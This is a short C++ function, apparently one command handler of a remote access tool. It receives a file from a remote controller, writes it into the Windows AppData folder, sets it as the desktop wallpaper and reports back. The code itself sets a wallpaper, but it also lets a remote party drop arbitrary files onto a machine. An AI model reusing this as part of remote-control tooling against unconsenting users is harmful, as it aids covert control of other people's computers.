void ChangeWallpaper()
{
    std::string fileName = recv(1), location = appdata + "\\" + fileName, data;
    int fileSize = atoi(recv(0).data());

    try {
        std::string fileData = recvAll(fileSize, 1);
		if (fileData == "error") {
			throw std::bad_alloc();
		
		} send("received");

        FILE *RemoteFile = fopen(location.data(), "wb");
		fwrite(fileData.data(), 1, fileData.size(), RemoteFile);
		fclose(RemoteFile);

        SystemParametersInfoA
        (
            SPI_SETDESKWALLPAPER,
            0,
            (PVOID)location.data(),
            SPIF_UPDATEINIFILE
        
        ); logs.push_back(location);

    } catch (std::bad_alloc) {
        send("bad_alloc");
    }
}